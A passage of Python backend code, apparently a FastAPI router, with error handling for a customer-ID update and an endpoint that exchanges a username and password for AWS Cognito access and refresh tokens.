        case = db.update_openloop_customer_id(openloop_customer_id, email)
        return case
    except Exception as e:
        logger.error(
            "update_stripe_openloop_customer_id: " + "openloop_customer_id=" + openloop_customer_id + " email=" + email + " error=" + str(
                e))
        logger.error(e)
        return {"status": "failed", "error": str(e)}


@router.post('/get-cognito-token')
async def get_cognito_token(request: Request):
    logger.info('API: get_cognito_token')
    data = await request.json()
    try:
        response = cognito_client.initiate_auth(
            ClientId="66fovpj4vcp9488lb9o7n3rv58",
            AuthFlow="USER_PASSWORD_AUTH",
            AuthParameters={"USERNAME": data.get("username"), "PASSWORD": data.get("password")},
        )
    except Exception as e:
        logger.error("get_cognito_token error= " + str(e))
        return {"status": "failure", "message": str(e)}
    access_token = response.get("AuthenticationResult", {}).get("AccessToken")
    refresh_token = response.get("AuthenticationResult", {}).get("RefreshToken")
    return {"message": "Success", "access_token": access_token, "refresh_token": refresh_token}